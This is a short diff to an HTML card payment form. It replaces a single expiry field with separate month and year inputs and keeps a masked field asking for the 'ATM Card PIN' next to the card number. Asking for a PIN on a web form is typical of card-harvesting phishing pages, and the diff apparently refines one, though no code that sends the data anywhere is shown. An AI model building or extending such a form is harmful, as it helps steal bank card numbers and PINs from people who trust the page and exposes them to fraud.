@@ -30,11 +30,15 @@
             <input type="text" class="card-input" placeholder="0000 0000 0000 0000" id="cardNumber" maxlength="19" oninput="formatCardNumber(this)" inputmode="numeric">
 
             <div class="row-inputs">
-                <div class="half-input">
-                    <label class="input-label">Card expiry date</label>
-                    <input type="text" class="expiry-input" placeholder="MM/YY" id="expiryCode" maxlength="5" oninput="formatExpiry(this)" inputmode="numeric">
+                <div class="third-input">
+                    <label class="input-label">Month</label>
+                    <input type="text" class="month-input" placeholder="MM" id="expiryMonth" maxlength="2" oninput="formatMonth(this)" inputmode="numeric">
                 </div>
-                <div class="half-input">
+                <div class="third-input">
+                    <label class="input-label">Year</label>
+                    <input type="text" class="year-input" placeholder="YY" id="expiryYear" maxlength="2" oninput="formatYear(this)" inputmode="numeric">
+                </div>
+                <div class="third-input">
                     <label class="input-label">ATM Card PIN</label>
                     <input type="password" class="pin-input" placeholder="Card Pin" id="cardPin" maxlength="4" inputmode="numeric">
                 </div>
